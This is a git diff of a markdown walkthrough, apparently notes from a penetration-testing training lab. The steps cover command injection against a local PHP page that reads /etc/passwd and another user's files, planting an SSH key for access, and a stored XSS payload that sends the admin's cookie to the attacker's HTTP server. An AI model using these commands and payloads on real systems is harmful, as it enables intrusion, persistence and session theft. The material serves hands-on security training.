@@ -114,6 +114,7 @@ I took my online training from the following website
 
 10.100.28.55
 ```
+## (Training Site Location)
 ________________________________________________________________________________________________________________
 ## Check the path in the robots.txt: 
     http://127.0.0.1:10001/net_test/industry_check.php
@@ -122,7 +123,15 @@ ________________________________________________________________________________
 ; pwd
 ; whoami
 ; ls -la /home/billybob
+; cat /etc/passwd
 ```
+## (Command Injection 1)
+________________________________________________________________________________________________________________
+## While here locate romanoff's file: 
+    ; find / -iname *romanoff* 2>/dev/null
+    ; ls -la /home/romanoff@mi.ru/
+    ; cat /home/romanoff@mi.ru/contracts    
+## (Command Injection 2)
 ________________________________________________________________________________________________________________
 ## Uploading SSH Key: 
     ; ls -la /home/billybob                                  #check if .ssh exists
@@ -132,22 +141,26 @@ ________________________________________________________________________________
     ; echo "your public ssh key here" >> /home/billybob/.ssh/authorized_keys    #placing ssh key in directory
     ; cat /home/billybob/.ssh/authorized_keys                #verifying the ssh key was emplaced
 ________________________________________________________________________________________________________________
-## *Authenticate* in a new pane to the alt ssh port with the user discovered: 
+## Authenticate in a new pane to the alt ssh port with the user discovered: 
     ssh -MS /tmp/t1 billybob@127.0.0.1 -p10002
+## (Malicious Upload)
 ________________________________________________________________________________________________________________
 ## On the user cat /etc/passwd: 
     cat /etc/passwd
 ________________________________________________________________________________________________________________
 ## Head back to the firefox website and check the trouble ticket: 
     http://127.0.0.1:10001/TT/ticket.php    #there is a link on one of the previous pages
+## (VIP email address)
 ________________________________________________________________________________________________________________
 ## On linux opstation run for the next part to work: 
     python3 -m http.server
 ________________________________________________________________________________________________________________
 ## Next retreive the admins cookie by running this in the comment section on the trouble ticket page: 
-### Name: Whatever you want, just use your linux op station float IP
+### Name: Whatever you want, just use your linux op station float IP 
     <script>document.location="http://10.50.21.223:8000/"+document.cookie;</script>
+## (Stored Cross Site Scripting XSS)
 ________________________________________________________________________________________________________________
+
 
 ________________________________________________________________________________________________________________
 
